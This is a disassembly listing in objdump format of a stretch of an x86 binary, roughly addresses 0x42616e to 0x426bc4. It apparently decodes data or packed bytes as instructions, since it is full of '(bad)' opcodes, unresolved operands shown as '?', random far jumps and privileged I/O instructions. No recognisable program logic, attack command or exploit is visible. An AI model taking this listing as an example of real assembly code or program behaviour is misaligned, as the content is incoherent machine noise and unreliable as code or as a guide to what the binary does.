  42616e:	les    ebx,FWORD PTR [edi+edx*1+0x0]
  426172:	mov    esp,0x64ffb3ce
  426177:	and    esp,DWORD PTR [edi+0x9]
  42617a:	inc    esp
  42617b:	or     eax,0x47b8348
  426180:	cwde   
  426181:	(bad)  [esi+0x14]
  426184:	push   edi
  426185:	inc    edx
  426186:	nop
  426187:	and    cl,BYTE PTR [edx+esi*2+0x54]
  42618b:	popf   
  42618c:	sbb    al,bh
  42618e:	icebp  
  42618f:	xor    cl,bl
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	aas    
  426201:	cli    
  426202:	add    al,0x63
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xc2000001
  42620d:	ss mov esi,0x96c20de5
  426213:	imul   ecx,DWORD PTR [eax],0xffffffe8
  426216:	shl    BYTE PTR [ebp+0x2b155365],cl
  42621c:	mov    ah,0x6f
  42621e:	or     dh,cl
  426220:	pop    esp
  426221:	dec    BYTE PTR [esi+0x30deea19]
  426227:	mov    edi,DWORD PTR [ebp-0x1f]
  42622a:	xor    DWORD PTR [esi-0x9],edx
  42622d:	in     eax,0x5e
  42622f:	add    BYTE PTR [ebp-0x6d1dc864],dh
  426235:	dec    ecx
  426236:	outs   dx,BYTE PTR ds:[esi]
  426237:	lods   eax,DWORD PTR ds:[esi]
  426238:	cmc    
  426239:	sbb    BYTE PTR [ecx-0x1b91e1ea],bl
  42623f:	leave  
  426240:	cs (bad) 
  426242:	adc    al,0xfd
  426244:	pop    edi
  426245:	mov    bl,0xad
  426247:	pop    esp
  426248:	bound  eax,QWORD PTR cs:[esi-0x47]
  42624c:	or     al,0x96
  42624e:	inc    esp
  42624f:	aad    0x99
  426251:	es out 0x63,eax
  426254:	mov    ecx,0x4072e1e6
  426259:	dec    DWORD PTR [esi]
  42625b:	cmp    cl,BYTE PTR [ecx-0x79fb82de]
  426261:	in     al,0x29
  426263:	fnsave [ebp-0x521dcf65]
  426269:	popf   
  42626a:	mov    ecx,0x70a8d53
  42626f:	lahf   
  426270:	xchg   bl,ah
  426272:	add    dh,BYTE PTR [edi+0x2ce6528e]
  426278:	(bad)  
  426279:	call   0x35d03073
  42627e:	je     0x4262bb
  426280:	push   es
  426281:	and    al,0xbf
  426283:	add    ebp,ecx
  426285:	sub    eax,0x9204a4be
  42628a:	sahf   
  42628b:	cmp    eax,0xa680e84e
  426290:	ret    0x2d2e
  426293:	jb     0x426257
  426295:	addr16 xor esp,eax
  426298:	inc    esi
  426299:	arpl   sp,bx
  42629b:	jl     0x4262e1
  42629d:	jmp    0xc8edbde6
  4262a2:	mov    al,0xec
  4262a4:	not    DWORD PTR [ebp+esi*8+0x59f928d5]
  4262ab:	jae    0x426278
  4262ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262ae:	push   edx
  4262af:	and    BYTE PTR [ebp+0x27c885f],cl
  4262b5:	ins    DWORD PTR es:[edi],dx
  4262b6:	push   ecx
  4262b7:	dec    ebx
  4262b8:	jp     0x42632d
  4262ba:	push   es
  4262bb:	mov    ebx,0x7d12dbb2
  4262c0:	hlt    
  4262c1:	mov    edi,0x8a7b6346
  4262c6:	dec    eax
  4262c7:	adc    ecx,DWORD PTR [ecx-0x697e82dc]
  4262cd:	mov    dl,0x8e
  4262cf:	push   edi
  4262d0:	cmp    ebp,DWORD PTR ss:0x5a3e26c8
  4262d7:	jne    0x426318
  4262d9:	pop    ebp
  4262da:	mov    edx,0xa6db0376
  4262df:	fs push eax
  4262e1:	mov    DWORD PTR [esi-0x40],ebp
  4262e4:	mov    dl,0x3
  4262e6:	fist   WORD PTR [esp+eiz*2+0x7d]
  4262ea:	test   eax,0x50a9d796
  4262ef:	mov    ?,ebp
  4262f1:	jmp    0x6dcd5a25
  4262f6:	jo     0x4262f8
  4262f8:	inc    edi
  4262f9:	rcr    DWORD PTR [edi+0x72cac165],0xad
  426300:	jbe    0x426370
  426302:	retf   0x64d3
  426305:	sbb    edi,DWORD PTR [ecx+ebp*1-0x24]
  426309:	pushf  
  42630a:	inc    ebx
  42630b:	shr    BYTE PTR [edx+ebp*4],cl
  42630e:	adc    ecx,ebx
  426310:	aad    0x0
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x977e75bb
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x11000001
  42638d:	scas   al,BYTE PTR es:[edi]
  42638e:	cmp    ebx,DWORD PTR [edi-0x30d0601a]
  426394:	mov    DWORD PTR [ebp+0x85931f6],ebx
  42639a:	fist   WORD PTR [eax-0x509468fb]
  4263a0:	into   
  4263a1:	add    dl,BYTE PTR [esi+0x41fc90af]
  4263a7:	xchg   DWORD PTR [eax],ecx
  4263a9:	inc    ecx
  4263aa:	in     eax,dx
  4263ab:	sub    al,0xa9
  4263ad:	mov    ebx,fs
  4263af:	sub    esp,DWORD PTR [esi]
  4263b1:	mov    ch,0x44
  4263b3:	xchg   ecx,eax
  4263b4:	test   al,0xf7
  4263b6:	push   ecx
  4263b7:	call   0x6b4c:0xa4c8f302
  4263be:	aad    0x79
  4263c0:	fild   WORD PTR [esi+eiz*4+0x4]
  4263c4:	nop
  4263c5:	dec    eax
  4263c6:	xchg   ebp,eax
  4263c7:	add    BYTE PTR [ecx+0x6a],dl
  4263ca:	es cli 
  4263cc:	popa   
  4263cd:	push   esi
  4263ce:	dec    ecx
  4263cf:	stos   DWORD PTR es:[edi],eax
  4263d0:	mov    dh,0xef
  4263d2:	add    cl,cl
  4263d4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4263d6:	idiv   esp
  4263d8:	jne    0x4263fc
  4263da:	bound  esp,QWORD PTR [edx-0x6e]
  4263dd:	jle    0x4263a8
  4263df:	pop    es
  4263e0:	inc    esp
  4263e1:	sbb    edx,ebp
  4263e3:	les    ebx,FWORD PTR [ebp+0x17]
  4263e6:	and    al,0xe6
  4263e8:	mov    cl,0x5d
  4263ea:	in     al,dx
  4263eb:	and    BYTE PTR [esi],ah
  4263ed:	jge    0x42637f
  4263ef:	push   eax
  4263f0:	pop    ss
  4263f1:	adc    al,dl
  4263f3:	adc    al,0x9f
  4263f5:	int3   
  4263f6:	cmp    eax,0xbf5f1628
  4263fb:	cmp    dh,BYTE PTR [ebx]
  4263fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263fe:	repnz xchg esp,eax
  426400:	pop    ebp
  426401:	daa    
  426402:	xchg   ebx,eax
  426403:	scas   al,BYTE PTR es:[edi]
  426404:	loopne 0x4263eb
  426406:	pop    edx
  426407:	retf   
  426408:	cmp    bl,bl
  42640a:	mov    esi,0x589fe31d
  42640f:	adc    edi,edi
  426411:	repnz xor DWORD PTR es:[ebp+0x23],0x8
  426417:	sub    BYTE PTR [edi-0x7b9bacff],0xed
  42641e:	arpl   WORD PTR es:[ecx-0x31],di
  426422:	cmp    BYTE PTR [ecx+edx*8-0x62],al
  426426:	gs cmp al,0x8d
  426429:	jmp    0xbfacf4eb
  42642e:	pop    ebx
  42642f:	in     al,dx
  426430:	push   ebp
  426431:	rcr    DWORD PTR [eax+0x2c],1
  426434:	jmp    0x9843:0x75fb2079
  42643b:	mov    eax,ds:0xf7641b61
  426440:	fistp  QWORD PTR [edi+edi*2]
  426443:	lods   al,BYTE PTR ds:[esi]
  426444:	sub    ebx,esp
  426446:	push   ebp
  426447:	int    0x8
  426449:	jne    0x426431
  42644b:	pop    eax
  42644c:	dec    ebx
  42644d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42644e:	and    eax,0x13d32d59
  426453:	imul   esp,DWORD PTR [esi-0x17],0xffffff94
  426457:	adc    cl,BYTE PTR [edi+ebx*8]
  42645a:	lock out 0x88,al
  42645d:	cld    
  42645e:	and    eax,0xcb09d358
  426463:	or     esi,DWORD PTR [esi+0x2004eeab]
  426469:	out    0x33,al
  42646b:	jle    0x4264dd
  42646d:	cmp    esp,DWORD PTR [eax-0x38]
  426470:	adc    ch,BYTE PTR [ebp+0x1]
  426473:	sub    eax,0x3556ca1
  426478:	in     eax,dx
  426479:	(bad)  [ebp+0x5]
  42647c:	jo     0x42644f
  42647e:	jae    0x426447
  426480:	clc    
  426481:	scas   eax,DWORD PTR es:[edi]
  426482:	into   
  426483:	mov    ds,WORD PTR [esi]
  426485:	hlt    
  426486:	mov    al,0xc7
  426488:	ror    BYTE PTR [ecx+0x73],cl
  42648b:	adc    ch,al
  42648d:	or     DWORD PTR [edi+0x848],0x0
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0x476f5885]
  426503:	fnsave [eax+0x5000199]
  426509:	add    DWORD PTR [eax],eax
  42650b:	add    BYTE PTR [ebp+0x65],cl
  42650e:	je     0x42652e
  426510:	das    
  426511:	pop    ds
  426512:	pop    ecx
  426513:	sbb    eax,DWORD PTR [esi-0x5e126f0b]
  426519:	jl     0x426506
  42651b:	lods   al,BYTE PTR ds:[esi]
  42651c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42651d:	adc    bl,dl
  42651f:	retf   0x4ab1
  426522:	daa    
  426523:	cli    
  426524:	iret   
  426525:	push   edx
  426526:	push   cs
  426527:	mov    ecx,0x927e24ca
  42652c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42652d:	rcr    BYTE PTR [ebx+0x58],0x6e
  426531:	dec    ecx
  426532:	shl    BYTE PTR ds:0xe38a4873,0x72
  426539:	imul   ebx,DWORD PTR [ecx+0x3ea492e5],0xffffffd2
  426540:	aam    0x1d
  426542:	es jnp 0x4264f3
  426545:	xchg   ebx,eax
  426546:	ret    
  426547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426548:	fistp  QWORD PTR [edx+0x3f479137]
  42654e:	add    bl,ah
  426550:	(bad)  
  426551:	iret   
  426552:	stos   BYTE PTR es:[edi],al
  426553:	arpl   WORD PTR [ebx-0x55],di
  426556:	jge    0x426568
  426558:	xor    DWORD PTR [ebp-0x7dd9f9eb],edx
  42655e:	aaa    
  42655f:	xor    eax,0x6ad8e63
  426564:	in     eax,dx
  426565:	out    0x6f,al
  426567:	cmc    
  426568:	pushf  
  426569:	add    edi,DWORD PTR [ebp-0x12358509]
  42656f:	mov    eax,cs
  426571:	inc    edi
  426572:	fmul   DWORD PTR [ebp+0x1]
  426575:	xor    DWORD PTR [ebx+0x26],ecx
  426578:	les    ecx,FWORD PTR [edx+0x68]
  42657b:	jno    0x426576
  42657d:	dec    DWORD PTR [esi]
  42657f:	dec    edi
  426580:	out    dx,al
  426581:	sub    al,0xa8
  426583:	jecxz  0x4265c1
  426585:	xor    eax,0x8061b12c
  42658a:	dec    edx
  42658b:	mov    dl,0xcb
  42658d:	mov    ah,0xac
  42658f:	retf   
  426590:	and    edi,DWORD PTR ds:0xb0e7f312
  426596:	div    DWORD PTR [edx+0x17]
  426599:	repnz mov bh,0xb
  42659c:	mov    WORD PTR [ebp+0x29],?
  42659f:	cmp    al,0x4c
  4265a1:	leave  
  4265a2:	jns    0x426587
  4265a4:	jb     0x42657b
  4265a6:	add    al,BYTE PTR [edi]
  4265a8:	inc    eax
  4265a9:	aas    
  4265aa:	cmc    
  4265ab:	add    edi,DWORD PTR ds:0x2c781d56
  4265b1:	mov    al,cl
  4265b3:	push   cs
  4265b4:	jmp    0x263d:0xe2cf1fa5
  4265bb:	ja     0x426599
  4265bd:	xchg   edi,eax
  4265be:	iret   
  4265bf:	fcomp  QWORD PTR [ecx]
  4265c1:	dec    esi
  4265c2:	mov    eax,0xe48b9a0c
  4265c7:	sbb    edx,DWORD PTR [edi+ebx*1]
  4265ca:	popa   
  4265cb:	popf   
  4265cc:	es xchg esp,eax
  4265ce:	sbb    ah,BYTE PTR [esi]
  4265d0:	or     ah,BYTE PTR [eax]
  4265d2:	(bad)  
  4265d3:	sbb    al,0xae
  4265d5:	rcr    BYTE PTR [ecx],0x95
  4265d8:	xor    DWORD PTR [edx-0x50],ebx
  4265db:	dec    edi
  4265dc:	dec    edi
  4265dd:	or     BYTE PTR [ecx+0x6b224730],bh
  4265e3:	or     esp,DWORD PTR [ecx+0x2b]
  4265e6:	mov    ?,ebp
  4265e8:	lods   eax,DWORD PTR ds:[esi]
  4265e9:	jne    0x42664c
  4265eb:	fnstsw WORD PTR [esi]
  4265ed:	sub    esp,DWORD PTR [esi]
  4265ef:	fs pop ss
  4265f1:	mov    al,0xcf
  4265f3:	xchg   ecx,eax
  4265f4:	xchg   ecx,eax
  4265f5:	ins    DWORD PTR es:[edi],dx
  4265f6:	mov    dl,0xc6
  4265f8:	shl    edx,0x27
  4265fb:	sbb    BYTE PTR [edi],dh
  4265fd:	mov    dh,0x52
  4265ff:	lods   al,BYTE PTR ds:[esi]
  426600:	add    edi,DWORD PTR [ebp-0x66]
  426603:	cwde   
  426604:	loopne 0x426598
  426606:	sti    
  426607:	lods   eax,DWORD PTR ds:[esi]
  426608:	and    edx,DWORD PTR [edx-0x80]
  42660b:	fimul  DWORD PTR [eax+0x55]
  42660e:	bnd jg 0x4265e7
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x6280925c]
  426682:	test   BYTE PTR [ecx],dh
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x86000001
  42668d:	mov    ch,0x9a
  42668f:	jno    0x4266b6
  426691:	inc    ecx
  426692:	cmp    bh,cl
  426694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426695:	into   
  426696:	iret   
  426697:	mov    ebx,0x9bd1058
  42669c:	lds    edx,FWORD PTR [ebx+edi*4]
  42669f:	in     eax,0xb
  4266a1:	inc    esp
  4266a2:	enter  0x83ee,0x29
  4266a6:	addr16 out 0xc4,al
  4266a9:	xchg   esi,eax
  4266aa:	add    al,0x2b
  4266ac:	mov    bh,0x94
  4266ae:	dec    ebp
  4266af:	rcr    DWORD PTR [edx+0xd],1
  4266b2:	sbb    eax,edi
  4266b4:	or     BYTE PTR [ebx-0x4290c35c],ah
  4266ba:	mov    ebp,0x5faecd94
  4266bf:	(bad)  
  4266c0:	ins    BYTE PTR es:[edi],dx
  4266c1:	cli    
  4266c2:	scas   eax,DWORD PTR es:[edi]
  4266c3:	lea    ecx,[ebx-0x3c1ab97b]
  4266c9:	jmp    0xd4f3eb00
  4266ce:	pop    esi
  4266cf:	adc    al,0x38
  4266d1:	mov    dh,0xae
  4266d3:	adc    DWORD PTR [esi-0x2903a2e2],esp
  4266d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266da:	add    eax,esp
  4266dc:	sahf   
  4266dd:	in     eax,0xe0
  4266df:	sbb    DWORD PTR [ebx-0x1fa02c87],ecx
  4266e5:	xchg   edi,eax
  4266e6:	xchg   esi,eax
  4266e7:	aad    0x24
  4266e9:	mov    esi,0xc641722d
  4266ee:	pop    eax
  4266ef:	pop    ebp
  4266f0:	push   0xffffffd4
  4266f2:	pop    eax
  4266f3:	sub    dh,bl
  4266f5:	mov    edi,DWORD PTR [ecx]
  4266f7:	xchg   esp,eax
  4266f8:	xchg   esp,eax
  4266f9:	mov    esp,0x25e6432c
  4266fe:	addr16 sbb cl,dh
  426701:	repnz cmp BYTE PTR [edi],dl
  426704:	cld    
  426705:	sar    BYTE PTR [eax],1
  426707:	scas   al,BYTE PTR es:[edi]
  426708:	dec    ecx
  426709:	mov    ebx,DWORD PTR [edx]
  42670b:	jno    0x4266a5
  42670d:	fsub   QWORD PTR [edi]
  42670f:	cmp    eax,0x9c17d2b3
  426714:	xchg   ebx,eax
  426715:	mov    eax,edi
  426717:	daa    
  426718:	mov    esi,0x2849fda4
  42671d:	jo     0x42674b
  42671f:	mov    BYTE PTR [eax+0x60],bh
  426722:	adc    BYTE PTR [ebx+eax*8],bl
  426725:	stos   BYTE PTR es:[edi],al
  426726:	xchg   BYTE PTR [esi+0x2cf9e2a3],ah
  42672c:	xchg   edx,eax
  42672d:	(bad)  
  42672e:	mov    ch,0xa1
  426730:	xor    BYTE PTR [esi+0x7c],al
  426733:	mov    bh,BYTE PTR [esi-0x40b715d]
  426739:	dec    eax
  42673a:	(bad)  
  42673b:	sub    al,0x7a
  42673d:	adc    edi,edx
  42673f:	neg    ebx
  426741:	icebp  
  426742:	out    dx,eax
  426743:	sub    al,0x6b
  426745:	stc    
  426746:	mov    dh,BYTE PTR [eax+eiz*1+0x11]
  42674a:	into   
  42674b:	dec    edx
  42674c:	in     eax,dx
  42674d:	popf   
  42674e:	dec    ebp
  42674f:	test   DWORD PTR [esp+ecx*1+0x4ada9d5],ecx
  426756:	or     al,0x98
  426758:	sub    ah,BYTE PTR [esi+0x27]
  42675b:	pop    esi
  42675c:	data16 out dx,al
  42675e:	xchg   edx,eax
  42675f:	and    dl,BYTE PTR [edx+edi*2+0x1b]
  426763:	push   ss
  426764:	mov    ecx,0xb70a1716
  426769:	sbb    BYTE PTR [ebx+0x5ef5594a],al
  42676f:	push   esi
  426770:	repz inc edx
  426772:	fcomp  DWORD PTR [ecx]
  426774:	add    BYTE PTR [eax+ebp*2+0x2d111ea9],bh
  42677b:	repz inc ebx
  42677d:	ins    BYTE PTR es:[edi],dx
  42677e:	loopne 0x4267b0
  426780:	or     ebx,edi
  426782:	pop    esi
  426783:	push   ss
  426784:	sbb    DWORD PTR [esi-0x59],esp
  426787:	mov    esp,0x6ac1a164
  42678c:	cs ss lock hlt 
  426790:	pop    esi
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	mov    cl,BYTE PTR [edx]
  426802:	jg     0x4267b9
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    ah,ah
  42680d:	sbb    DWORD PTR [edi+eax*4+0x46eed7c4],eax
  426814:	mov    cl,0x1e
  426816:	pop    es
  426817:	jns    0x4267aa
  426819:	cdq    
  42681a:	jbe    0x4267ad
  42681c:	sub    dl,ch
  42681e:	mov    dl,0x40
  426820:	stos   BYTE PTR es:[edi],al
  426821:	push   0x978a3f8c
  426826:	sub    al,0x96
  426828:	cmp    BYTE PTR [eax+0x5d],ah
  42682b:	inc    edx
  42682c:	cmp    BYTE PTR [eax+eiz*2+0x13],cl
  426830:	push   es
  426831:	pop    esi
  426832:	scas   eax,DWORD PTR es:[edi]
  426833:	sub    eax,0x942cbcf5
  426838:	inc    esp
  426839:	lea    ecx,[edx+0x441b53f9]
  42683f:	das    
  426840:	pop    edx
  426841:	and    al,0x9a
  426843:	dec    esi
  426844:	jb     0x4267d5
  426846:	dec    ebx
  426847:	xchg   ecx,ebx
  426849:	loope  0x426855
  42684b:	pop    esi
  42684c:	hlt    
  42684d:	jne    0x426803
  42684f:	lods   al,BYTE PTR ds:[esi]
  426850:	xchg   esi,eax
  426851:	test   al,0xa0
  426853:	bnd jns 0x4268a3
  426856:	out    dx,eax
  426857:	push   0x7c
  426859:	mov    al,0x72
  42685b:	fld    TBYTE PTR [ecx+0x3e]
  42685e:	pop    sp
  426860:	mov    dl,dh
  426862:	clc    
  426863:	push   ecx
  426864:	xchg   edx,eax
  426865:	and    ebp,DWORD PTR ds:0x568db761
  42686b:	mov    esi,0xd89e8950
  426870:	or     eax,0xfbfc52c0
  426875:	pop    edi
  426876:	mov    edx,0xbdf8d625
  42687b:	test   BYTE PTR [ebx+0x7653495f],ah
  426881:	leave  
  426882:	sbb    ebp,ebx
  426884:	lods   eax,DWORD PTR ds:[esi]
  426885:	push   ebx
  426886:	mov    WORD PTR [ebx],cs
  426888:	mov    DWORD PTR [ebp-0x5a],0x309cd7fb
  42688f:	jl     0x426834
  426891:	(bad)  
  426892:	mov    edi,0x92538353
  426897:	daa    
  426898:	sub    DWORD PTR [ebp+esi*1+0x65],edi
  42689c:	mov    al,ds:0x1f7887e4
  4268a1:	push   edi
  4268a2:	pop    ds
  4268a3:	cld    
  4268a4:	cmp    dh,bl
  4268a6:	dec    ecx
  4268a7:	hlt    
  4268a8:	test   eax,0x8db9a131
  4268ad:	out    dx,eax
  4268ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268af:	jb     0x426877
  4268b1:	cdq    
  4268b2:	int    0xd7
  4268b4:	add    eax,ebx
  4268b6:	push   cs
  4268b7:	out    0xff,eax
  4268b9:	(bad)  
  4268ba:	fisubr WORD PTR [edx]
  4268bc:	pusha  
  4268bd:	inc    esi
  4268be:	icebp  
  4268bf:	pop    ss
  4268c0:	fdiv   DWORD PTR [esi]
  4268c2:	icebp  
  4268c3:	rcl    BYTE PTR [esi-0x26d167d8],cl
  4268c9:	scas   eax,DWORD PTR es:[edi]
  4268ca:	pop    esp
  4268cb:	inc    ebx
  4268cc:	jmp    DWORD PTR [ebp+0x6df0331a]
  4268d2:	ss aad 0x49
  4268d5:	and    DWORD PTR [ecx],0xbf01c78a
  4268db:	sbb    ch,cl
  4268dd:	ins    BYTE PTR es:[edi],dx
  4268de:	dec    eax
  4268df:	jno    0x426888
  4268e1:	jns    0x42686d
  4268e3:	xlat   BYTE PTR ds:[ebx]
  4268e4:	xor    DWORD PTR [ebp+0x1c3e5342],0xad826f26
  4268ee:	cmp    DWORD PTR [eax],edx
  4268f0:	test   al,0xdf
  4268f2:	pop    ecx
  4268f3:	and    BYTE PTR [edx+edi*4+0x34],0x9
  4268f8:	arpl   WORD PTR [ecx+0x7a342dc3],si
  4268fe:	ins    BYTE PTR es:[edi],dx
  4268ff:	in     al,0x1a
  426901:	mov    al,dl
  426903:	sbb    ch,0xb2
  426906:	sar    BYTE PTR [ecx+0xa47456e],cl
  42690c:	pop    eax
  42690d:	mov    ebp,DWORD PTR [edi+0x7d]
  426910:	cmp    al,BYTE PTR [eax]
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ebx,DWORD PTR [ebx-0x17]
  426982:	pushf  
  426983:	mov    dl,0xbf
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0xb7000001
  42698d:	xchg   esp,eax
  42698e:	and    BYTE PTR [edi+0x15d7f751],0xa3
  426995:	fiadd  DWORD PTR [esi]
  426997:	xor    BYTE PTR [edi+0x7ac3e898],al
  42699d:	or     DWORD PTR ds:0xdaceadf6,eax
  4269a3:	outs   dx,BYTE PTR ds:[esi]
  4269a4:	pop    esp
  4269a5:	jmp    0x2b43:0x6ecde8a1
  4269ac:	aam    0x1a
  4269ae:	pop    edx
  4269af:	dec    ebx
  4269b0:	cmp    dl,dl
  4269b2:	pop    edx
  4269b3:	fsubp  st(4),st
  4269b5:	adc    eax,0xd0dac208
  4269ba:	inc    edi
  4269bb:	retf   0x4d10
  4269be:	or     dh,BYTE PTR [edi+0x38]
  4269c1:	or     ebx,DWORD PTR [edi]
  4269c3:	ret    0x34c0
  4269c6:	push   es
  4269c7:	or     al,0x42
  4269c9:	push   ebx
  4269ca:	cmc    
  4269cb:	dec    edx
  4269cc:	int    0x5e
  4269ce:	pop    edi
  4269cf:	(bad)  
  4269d1:	mov    bl,0x4a
  4269d3:	sbb    DWORD PTR [ebx],0xaadc100b
  4269d9:	cmp    al,0xec
  4269db:	mov    ds:0x8104a923,al
  4269e0:	dec    ecx
  4269e1:	xor    al,BYTE PTR [eax+ebx*1]
  4269e4:	jae    0x9827b789
  4269ea:	push   0x8da0bc8b
  4269ef:	and    edi,edx
  4269f1:	jbe    0x4269da
  4269f3:	sbb    DWORD PTR [eax+0x2f8b9c75],eax
  4269f9:	mov    edx,0x13f0ee48
  4269fe:	arpl   WORD PTR [ebx+0x66],dx
  426a01:	add    al,0x1c
  426a03:	(bad)  
  426a04:	and    al,0xa8
  426a06:	jne    0x4269e3
  426a08:	dec    edx
  426a09:	cmc    
  426a0a:	ret    0x1dd
  426a0d:	add    al,0xe1
  426a0f:	retf   
  426a10:	push   es
  426a11:	mov    ds:0xf16de915,al
  426a16:	cwde   
  426a17:	pop    esi
  426a18:	jbe    0x426a8d
  426a1a:	out    0xb5,al
  426a1c:	in     al,dx
  426a1d:	pop    ebp
  426a1e:	enter  0x9b29,0x10
  426a22:	mov    ch,0x85
  426a24:	stos   DWORD PTR es:[edi],eax
  426a25:	inc    DWORD PTR [eax+0x444f259c]
  426a2b:	and    eax,0x28b67e7c
  426a30:	pop    esp
  426a31:	jbe    0x426a53
  426a33:	jge    0x426aa5
  426a35:	mov    bl,BYTE PTR [eax]
  426a37:	shl    ah,0x3
  426a3a:	jno    0x426a44
  426a3c:	in     al,0x20
  426a3e:	sbb    al,0xbc
  426a40:	pusha  
  426a41:	sahf   
  426a42:	fs push esi
  426a44:	pop    eax
  426a45:	add    eax,0x5222ed72
  426a4a:	popf   
  426a4b:	iret   
  426a4c:	jo     0x426a23
  426a4e:	adc    BYTE PTR [edx],ah
  426a50:	stc    
  426a51:	jns    0x570573ad
  426a57:	and    eax,0x7c98a5d2
  426a5c:	mov    ecx,0x349ea00b
  426a61:	dec    ebp
  426a62:	cli    
  426a63:	ror    BYTE PTR cs:[edx],cl
  426a66:	and    al,0xb1
  426a68:	repnz and dl,BYTE PTR [ebx-0x38347c93]
  426a6f:	push   ecx
  426a70:	(bad)  
  426a72:	or     edi,DWORD PTR [ecx]
  426a74:	xor    ah,BYTE PTR [eax+0x68715e7d]
  426a7a:	jg     0x426a49
  426a7c:	ja     0x426a33
  426a7e:	add    BYTE PTR [edi+0x77632a2e],0xcb
  426a85:	cmp    BYTE PTR [ebp+0x1e2a228f],dl
  426a8b:	xchg   DWORD PTR [eax+0x64],eax
  426a8e:	fldcw  WORD PTR ds:0x2a
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x55
  426b01:	popa   
  426b02:	push   0x19dc45c
  426b07:	add    BYTE PTR ds:0x31000001,al
  426b0d:	adc    eax,DWORD PTR [ebp-0x644279b7]
  426b13:	shr    DWORD PTR [eax-0x489fbdc5],cl
  426b19:	push   edi
  426b1a:	(bad)  
  426b1b:	scas   eax,DWORD PTR es:[edi]
  426b1c:	bound  esi,QWORD PTR [eax]
  426b1e:	pop    esp
  426b1f:	push   ss
  426b20:	ja     0x426b9d
  426b22:	iret   
  426b23:	gs and eax,0x1642fdee
  426b29:	adc    eax,0x4146f255
  426b2e:	jbe    0x426ad6
  426b30:	xchg   DWORD PTR [ebx-0x4b],eax
  426b33:	imul   esi,DWORD PTR [edi],0xffffffbb
  426b36:	shl    ch,1
  426b38:	jo     0x426b2d
  426b3a:	xchg   ecx,eax
  426b3b:	ds dec esi
  426b3d:	mov    al,ds:0x98ef3641
  426b42:	stos   DWORD PTR es:[edi],eax
  426b43:	push   ebp
  426b44:	adc    BYTE PTR [edx-0x2cbc3080],0x5d
  426b4b:	cmp    esp,DWORD PTR [ebx+0x29]
  426b4e:	lock xchg BYTE PTR [ebx-0x16],dl
  426b52:	and    DWORD PTR [ebp+0x5d],edi
  426b55:	ins    DWORD PTR es:[edi],dx
  426b56:	jns    0x426b68
  426b58:	shl    BYTE PTR [ecx-0x33fb80c],1
  426b5e:	bound  esi,QWORD PTR [edi-0x17]
  426b61:	adc    eax,0x8a78d02d
  426b66:	call   0xa082:0x16e2ff78
  426b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b6e:	not    BYTE PTR [ecx]
  426b70:	enter  0xe62a,0xb
  426b74:	test   DWORD PTR [esi+0x166a581e],esi
  426b7a:	scas   eax,DWORD PTR es:[edi]
  426b7b:	mov    esi,0xa4d209
  426b80:	pop    ebp
  426b81:	sar    esp,0x8
  426b84:	pusha  
  426b85:	dec    edx
  426b86:	fisubr DWORD PTR [ebp+0x3]
  426b89:	fidivr WORD PTR [ecx-0x5ead0089]
  426b8f:	xchg   ch,bh
  426b91:	data16 sar BYTE PTR [eax-0x8],0x19
  426b96:	pop    ebp
  426b97:	int3   
  426b98:	retf   
  426b99:	ret    0xacf1
  426b9c:	out    0x82,al
  426b9e:	fwait
  426b9f:	std    
  426ba0:	icebp  
  426ba1:	adc    DWORD PTR [esp+ecx*2-0x6f],0x4fe8423b
  426ba9:	leave  
  426baa:	mov    DWORD PTR [ecx+0x8],edx
  426bad:	mov    ch,BYTE PTR [eax]
  426baf:	and    eax,0x4f2a6135
  426bb4:	es adc al,0x4e
  426bb7:	mov    ah,0x17
  426bb9:	shl    cl,1
  426bbb:	xchg   esp,eax
  426bbc:	cs push esp
  426bbe:	pop    esp
  426bbf:	mov    edx,0x5ce71fa7
  426bc4:	ret    0x2162
